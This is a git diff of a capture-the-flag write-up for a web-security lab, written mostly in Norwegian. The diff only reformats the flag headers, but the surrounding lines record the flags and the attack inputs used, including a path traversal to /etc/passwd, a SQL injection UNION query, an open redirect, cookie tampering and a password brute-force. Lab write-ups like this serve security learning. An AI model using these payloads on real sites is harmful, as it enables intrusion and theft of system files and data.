@@ -30,7 +30,7 @@ Darkly writeups github:
 
 
 # Bruteforce/Flag01
-THE FLAG 01 IS : 61C08546B939E55C32A8CA914EB92378
+###THE FLAG 01 IS : 61C08546B939E55C32A8CA914EB92378
 
 Lagde et script som kjørte 2 for løkker. Begge løkkene gikkgjennom alle passordene i filen (xato.....) og i den inerste løkken skrev den ut passordene i et passord. Så alle passordene i filen ble satt sammen med alle passordene inkludert seg selv. Det endte totalt med 998001 passord grunnet at det var 999 passord i filen siden et av passordene var blankt som scriptet ikke tok med.
 
@@ -38,7 +38,7 @@ Etter det kjørte jeg det default scriptet med noen små justeringer og fikk ut 
 
 
 # Flag02 - Passord recovery
-THE FLAG 02 IS : 1E9FE7EE4CA5BA232C093AC95B732EEE
+###THE FLAG 02 IS : 1E9FE7EE4CA5BA232C093AC95B732EEE
 
 Editerte html coden:
 Ved å legge inn eget e-post i value i stede for den som lå der orginalt
@@ -51,14 +51,14 @@ Ved å legge inn eget e-post i value i stede for den som lå der orginalt
 
 
 # Flag03 - Albatros/NSA flag
-The flag 03 is : a343c8f25244f4661e641ffe7e36694a
+###The flag 03 is : a343c8f25244f4661e641ffe7e36694a
 
 ``` 
 curl -A "61c08546b939" -e "https://www.nsa.gov/" http://129.241.200.165:19680/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c | grep 'flag'
 ```
 
 # Flag04 - Survey
-THE FLAG 04 IS 5650CB0D8AB2BF52430F6929229BA459
+###THE FLAG 04 IS 5650CB0D8AB2BF52430F6929229BA459
 
 
 ```
@@ -87,7 +87,7 @@ Where
 p = Next_Prime(2^54)
 
 # Flag05
-FLAG 05: 137DDB469EFEB8309B53FF95A8991974
+###FLAG 05: 137DDB469EFEB8309B53FF95A8991974
 
 Redirect the webpage til en annnen side
 ```
@@ -95,7 +95,7 @@ http://129.241.200.165:19680/index.php?page=redirect&site=5650cb0
 ```
 
 # Flag06
-Flag05: 1cb82fec6d8479a822bad55e0824918e
+###Flag05: 1cb82fec6d8479a822bad55e0824918e
 
 Endre page, ved å gå til root og så inn i directory etc og vidre inn i passwd.
 Hentet opp deller av flagget når en går bakover i fil systemet og det siste ligger i etc/passwd
@@ -105,7 +105,7 @@ http://129.241.200.165:19680/index.php?page=../../../../../../../etc/passwd
 
 
 # Flag07
-Flag07: dbfa4f7c46dc570fcd4b71272cdd2f2c
+###Flag07: dbfa4f7c46dc570fcd4b71272cdd2f2c
 
 First tok jeg ut alle README filene
 ``` 
@@ -118,7 +118,7 @@ explorer.exe .			#åpner directory i file explorer windows
 ```
 
 # Flag08
-
+###Flag08
 
 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890
 http://129.241.200.165:19680/whatever/
@@ -131,7 +131,7 @@ http://129.241.200.165:19680/admin/index.php
 
 
 # Flag09 - cookie
-Flag 09: 07580b873bc9eb153f4f346c415421e1
+###Flag 09: 07580b873bc9eb153f4f346c415421e1
 
 satoshi 65558: 22c9b7866d7424dc4b90a03664f5136c966fb34c8edd751cfba6998fe2b5170f
 ```
@@ -145,7 +145,7 @@ endre cookie til 000000000a7dce5ac40e7a88fd61399bbe76da161c1d65cbc2ebf2bd364545e
 ```
 
 # Flag10
-Flag10: cfd650ecf156952e7764710e18c0b4fcb2179e3c48ac922ee4bb1d3d2210e8 
+###Flag10: cfd650ecf156952e7764710e18c0b4fcb2179e3c48ac922ee4bb1d3d2210e8 
 
 https://onlinehextools.com/xor-hex-numbers 
 
@@ -196,7 +196,7 @@ https://onlinehextools.com/xor-hex-numbers
 ```
 
 # Flag11
-Flag11: d843efc41266a0cc502dc23b149e5c95
+###Flag11: d843efc41266a0cc502dc23b149e5c95
 
 ID: 1=1 UNION SELECT comment12, titlec4 FROM images 
 Title: saepe
@@ -239,7 +239,7 @@ open unmerged.png
 
 
 # Flag12 - image upload
-The flag 12 is : e6c8265958ea4c13558df233e66117a7
+###The flag 12 is : e6c8265958ea4c13558df233e66117a7
 
 
 ```
@@ -265,7 +265,7 @@ print(r.text)
 ```
 
 # Flag13
-Congratulations Flag13 is 6bad301f529ea136b3427e9daf2e6b2e
+###Congratulations Flag13 is 6bad301f529ea136b3427e9daf2e6b2e
 ```
 http://129.241.200.165:19680/test.php
 ```
@@ -273,7 +273,7 @@ Tror dette kan også gjøres ved xss på http://129.241.200.165:19680/index.php?
 
 
 # Flag14
-THE FLAG 14 IS : A7DCADB231D434C43082783B0983AB74
+###THE FLAG 14 IS : A7DCADB231D434C43082783B0983AB74
 
 http://129.241.200.165:19680/?page=media&src=nsa
 
